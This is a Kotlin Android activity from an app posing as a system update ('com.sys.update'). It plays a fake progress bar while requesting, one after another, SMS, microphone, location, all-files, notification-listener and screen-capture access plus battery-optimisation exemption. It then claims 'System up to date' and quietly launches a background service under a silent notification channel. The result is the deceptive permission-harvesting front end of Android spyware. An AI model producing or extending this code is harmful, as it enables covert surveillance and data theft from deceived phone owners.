package com.sys.update

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private lateinit var tvSubStatus: TextView
    private lateinit var progressBar: ProgressBar

    private val PERM_REQUEST_CODE = 1001
    private val BATTERY_REQUEST_CODE = 1002
    private val SCREEN_REQUEST_CODE = 1003

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)
        tvSubStatus = findViewById(R.id.tvSubStatus)
        progressBar = findViewById(R.id.progressBar)

        startFakeProgress()
        requestPermissionsStep1()
    }

    private fun startFakeProgress() {
        progressBar.progress = 5
        tvStatus.text = getString(R.string.checking)
        val handler = android.os.Handler(mainLooper)
        var progress = 5
        val runnable = object : Runnable {
            override fun run() {
                if (progress < 90) {
                    progress += 1
                    progressBar.progress = progress
                    tvSubStatus.text = "${getString(R.string.syncing)} $progress%"
                    handler.postDelayed(this, 150)
                }
            }
        }
        handler.postDelayed(runnable, 150)
    }

    // ═══════════ STEP 1: Runtime Permissions ═══════════
    private fun requestPermissionsStep1() {
        val needed = mutableListOf<String>()

        // Storage
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        // SMS
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_SMS)

        // Microphone
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.RECORD_AUDIO)

        // Location
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        // Notifications (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
        } else {
            requestAllFilesAccess()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        requestAllFilesAccess()
    }

    // ═══════════ STEP 2: All Files Access ═══════════
    private fun requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
        }
        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
    }

    // ═══════════ STEP 3: Battery Optimization ═══════════
    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivityForResult(intent, BATTERY_REQUEST_CODE)
        } catch (_: Exception) {}
        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
    }

    // ═══════════ STEP 4: Notification Access ═══════════
    private fun requestNotifAccess() {
        if (!isNotifAccessGranted()) {
            try {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            } catch (_: Exception) {}
        }
        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 4000)
    }

    private fun isNotifAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    // ═══════════ STEP 5: Screen Capture Permission ═══════════
    private fun requestScreenCapture() {
        try {
            ScreenCapture.requestPermission(this, SCREEN_REQUEST_CODE)
        } catch (_: Exception) {}
        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 5000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_REQUEST_CODE) {
            ScreenCapture.onPermissionResult(this, resultCode, data)
        }
    }

    // ═══════════ STEP 6: Start Background Service ═══════════
    private fun startBackgroundService() {
        tvStatus.text = "System up to date"
        tvSubStatus.text = "Sync active in background"
        progressBar.progress = 100

        createNotificationChannel()
        val intent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sys_sync_channel",
                "System Sync",
                NotificationManager.IMPORTANCE_MIN
            )
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.setShowBadge(false)
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }
}
